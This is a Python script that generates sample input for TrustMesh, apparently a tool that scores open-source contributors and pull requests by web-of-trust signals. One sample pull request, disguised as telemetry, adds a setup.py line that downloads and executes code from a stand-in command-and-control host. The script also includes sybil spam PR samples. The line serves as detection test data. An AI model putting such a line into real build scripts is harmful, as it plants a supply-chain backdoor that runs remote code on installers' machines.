#!/usr/bin/env python3
"""
Generates representative TrustMesh example artifacts:
- examples/network_input.json: A 30-project topology with PR events.
"""

import json
import time
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
OUTPUT_INPUT_JSON = REPO_ROOT / "examples" / "network_input.json"

def generate_network_input():
    base_time = 1761930000.0  # Fixed reproducible POSIX timestamp
    
    # 30 Projects
    core_projects = ["Your-Project", "Project-B", "Project-C", "Project-D", "Project-E"]
    neutral_projects = [f"ecosystem-repo-{i:02d}" for i in range(1, 24)]
    adversarial_projects = ["Project-X", "Malicious-Node-Y"]
    all_projects = core_projects + neutral_projects + adversarial_projects
    assert len(all_projects) == 30

    # Peerings
    peerings = [
        {"source": "Your-Project", "target": "Project-B", "weight": 0.95, "context": "Upstream foundational engine"},
        {"source": "Your-Project", "target": "Project-C", "weight": 0.90, "context": "Security alliance auditor"},
        {"source": "Project-B", "target": "Project-D", "weight": 0.88, "context": "Shared maintainer governance"},
        {"source": "Project-C", "target": "Project-E", "weight": 0.85, "context": "Vulnerability disclosure channel"},
        {"source": "Your-Project", "target": "ecosystem-repo-01", "weight": 0.70, "context": "Ecosystem integration"},
        {"source": "Your-Project", "target": "ecosystem-repo-02", "weight": 0.65, "context": "Community plugin"},
    ]
    # Connect remaining neutral projects to core
    for i, np in enumerate(neutral_projects[2:]):
        peerings.append({
            "source": core_projects[i % len(core_projects)],
            "target": np,
            "weight": 0.60,
            "context": "Open source dependency",
        })

    # Vouches
    vouches = [
        {
            "project": "Project-B",
            "contributor": "alice_vouched",
            "confidence": 0.95,
            "notes": "Recognized core systems architect with verified commit signature"
        },
        {
            "project": "Project-B",
            "contributor": "marcus_core",
            "confidence": 0.90,
            "notes": "Active contributor across distributed storage crates"
        },
    ]

    # Denouncements
    denouncements = [
        {
            "project": "Project-C",
            "contributor": "dan_denounced",
            "severity": 0.92,
            "reason": "Supply chain malware injection attempt via post-install curl pipe"
        },
        {
            "project": "Project-X",
            "contributor": "charlie_newbie",
            "severity": 1.00,
            "reason": "Hostile false accusation from adversarial unpeered node"
        },
    ]

    # PR Events
    # 1. @alice_vouched (Vouched core dev)
    events = [
        {
            "pr_id": "pr_001_vouched",
            "repo_id": "Your-Project",
            "author": "alice_vouched",
            "account_age_days": 210.0,
            "timestamp": base_time + 100.0,
            "title": "feat: optimize Web-of-Trust graph traversal with AVX2 cosine similarity",
            "diff_content": "+def vectorized_cosine(a, b): return np.dot(a, b) / (np.linalg.norm(a)*np.linalg.norm(b))",
            "files_changed": ["src/trustmesh/graph.py"]
        },
        {
            "pr_id": "pr_002_vouched",
            "repo_id": "Your-Project",
            "author": "marcus_core",
            "account_age_days": 185.0,
            "timestamp": base_time + 300.0,
            "title": "perf: implement concurrent connection pool for network state lookups",
            "diff_content": "+with ThreadPoolExecutor(max_workers=8) as pool: results = pool.map(lookup, peers)",
            "files_changed": ["src/trustmesh/engine.py"]
        },
        {
            "pr_id": "pr_003_denounced",
            "repo_id": "Your-Project",
            "author": "dan_denounced",
            "account_age_days": 45.0,
            "timestamp": base_time + 500.0,
            "title": "build: update packaging build scripts with telemetry collection",
            "diff_content": "+import urllib.request; exec(urllib.request.urlopen('http://evil-c2.net/p').read())",
            "files_changed": ["setup.py"]
        },
        {
            "pr_id": "pr_004_newcomer",
            "repo_id": "Your-Project",
            "author": "charlie_newbie",
            "account_age_days": 2.0,
            "timestamp": base_time + 700.0,
            "title": "fix: correct off-by-one boundary condition in Dijkstra attenuation path",
            "diff_content": "-for i in range(len(path) + 1):\n+for i in range(len(path)):",
            "files_changed": ["src/trustmesh/graph.py"]
        },
        {
            "pr_id": "pr_005_newcomer",
            "repo_id": "Your-Project",
            "author": "elena_docs",
            "account_age_days": 3.5,
            "timestamp": base_time + 900.0,
            "title": "docs: add comprehensive quickstart guide and troubleshooting FAQs",
            "diff_content": "+## Quick Start Guide\n+```bash\n+trustmesh audit --network net.json --events ev.json\n+```",
            "files_changed": ["README.md"]
        },
        {
            "pr_id": "pr_006_newcomer",
            "repo_id": "Your-Project",
            "author": "frank_tester",
            "account_age_days": 4.0,
            "timestamp": base_time + 1100.0,
            "title": "test: add edge cases for negative weights in trust attenuation validation",
            "diff_content": "+def test_negative_weight():\n+    with pytest.raises(ValueError): add_trust(-0.5)",
            "files_changed": ["tests/test_graph.py"]
        },
    ]

    # Add 4 Coordinated Spam Events targeting Your-Project and ecosystem repos
    spam_targets = ["Your-Project", "ecosystem-repo-01", "ecosystem-repo-02", "ecosystem-repo-03"]
    for i in range(4):
        events.append({
            "pr_id": f"pr_spam_{i+7:03d}",
            "repo_id": spam_targets[i],
            "author": f"sybil_bot_{i+1:02d}",
            "account_age_days": 1.5,
            "timestamp": base_time + 1300.0 + (i * 120.0),
            "title": "Fixed typo in README",
            "diff_content": """
- The trust network are initialized automatically.
+ The trust network is initialized automatically.
- See docs/installation.md for details.
+ See docs/install.md for details.
""",
            "files_changed": ["README.md"]
        })

    payload = {
        "network_metadata": {
            "name": "TrustMesh 30-Project Ecosystem",
            "timestamp": base_time,
            "total_projects": len(all_projects),
        },
        "projects": all_projects,
        "peerings": peerings,
        "vouches": vouches,
        "denouncements": denouncements,
        "events": events,
    }

    OUTPUT_INPUT_JSON.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_INPUT_JSON, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2)

    print(f"Generated {OUTPUT_INPUT_JSON} ({len(all_projects)} projects, {len(events)} events).")

if __name__ == "__main__":
    generate_network_input()

